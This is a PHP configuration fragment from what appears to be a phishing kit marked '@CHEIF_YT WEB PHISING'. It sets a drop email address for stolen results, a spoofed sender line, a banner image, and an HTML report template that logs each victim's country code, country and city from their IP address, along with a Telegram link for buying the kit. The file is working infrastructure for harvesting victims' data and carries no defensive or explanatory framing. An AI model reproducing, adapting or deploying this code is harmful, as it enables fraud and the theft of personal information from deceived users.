<?php
$imel = "cheifyt63@gmail.com";
$sender = "From: 🇮🇳 𝐂𝐇𝐄𝐈𝐅 𝐘𝐓 🔥🔥 <cheifytstore@gmail.com>";
$banner = "https://user-images.githubusercontent.com/82880865/185098657-b5076936-b1c7-44c0-a18a-d688ec2c661b.jpg";
$more = '<table style="border-collapse: collapse; border-color: black; background: #98FF98" width="100%" border="1">
            <!-- @CHEIF_YT WEB PHISING -->
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>COUNTRY CODE</th>
                <th style="width: 60%; text-align: center;"><b>'.$callcode_ip.'</th> 
            </tr>
            <!-- @CHEIF_YT WEB PHISING -->
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>COUNTRY</th>
                <th style="width: 60%; text-align: center;"><b>'.$country_ip.'</th> 
            </tr>
            <!-- @CHEIF_YT WEB PHISING -->
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>CITY</th>
                <th style="width: 60%; text-align: center;"><b>'.$region_ip.'</th> 
            </tr>
            <!-- @CHEIF_YT WEB PHISING -->
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>BUY WEB</th>
                <th style="width: 70%; text-align: center;"><b><a href="https://t.me/CHEIF_YT">CLICK HERE</a></th> 
            </tr>
            <!-- @CHEIF_YT WEB PHISING -->
        </table>';

?>